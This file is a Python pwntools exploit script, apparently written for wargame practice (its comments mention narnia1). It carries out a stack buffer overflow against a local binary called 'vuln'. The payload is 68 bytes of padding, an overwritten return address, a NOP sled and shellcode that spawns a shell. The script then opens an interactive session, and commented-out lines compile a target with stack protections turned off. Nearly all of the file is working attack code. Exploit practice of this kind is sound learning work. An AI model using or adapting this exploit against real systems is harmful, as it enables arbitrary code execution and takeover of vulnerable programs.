#!/usr/bin/env python
from pwn import *
import os

# # Define the context of the working machine
# context(arch='i386', os='linux')
#
# # Compile the binary
# log.info("Compiling the binary narnia1_local")
# os.system('gcc narnia1.c -g -m32 -o narnia1_local -fno-stack-protector -z execstack')
#
# # Get a simple shellcode
# log.info("Putting together simple shellcode")
# shellcode = asm(shellcraft.sh())
# print(asm(shellcraft.sh()))
#
# log.info("Introduce shellcode in EGG env. variable")
# os.environ["EGG"] = shellcode

# log.info("Launching narnia1_local")
# sh = process('narnia1_local')
# sh.interactive()

# io = gdb.debug('./narnia1_local')
# '''
# # Wait until we hit the main executable's entry point
# break main
# continue
# ''')

# # Send a command to Bash
# io.sendline("echo hello")

# # Interact with the process
# io.interactive()



# context.terminal = "./vuln"
# context.terminal = "bash"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

ret_offset = 68
buf_addr = 0xffffcee8
ret_address = buf_addr+ret_offset+16
payload = ''

p = process('vuln')
# Garbage
payload += ret_offset * 'A'

# Overwrite ret_address, taking endianness into account
payload += p32(ret_address)

# Add nopsled
nops = '\x90'*100

# Alternative: asm('nop'), but the above is simpler and faster
payload += nops

# Assemble a shellcode from 'shellcraft' and append to payload
shellcode = asm(shellcraft.sh())
payload += shellcode
log.info("reaches")

# Attach to process
gdb.attach(p)

log.info("reaches this point")
# Wait for breakpoints, commands etc.
raw_input("Send payload?")

# Send payload
p.sendline(payload)

# Enjoy shell :-)
p.interactive()
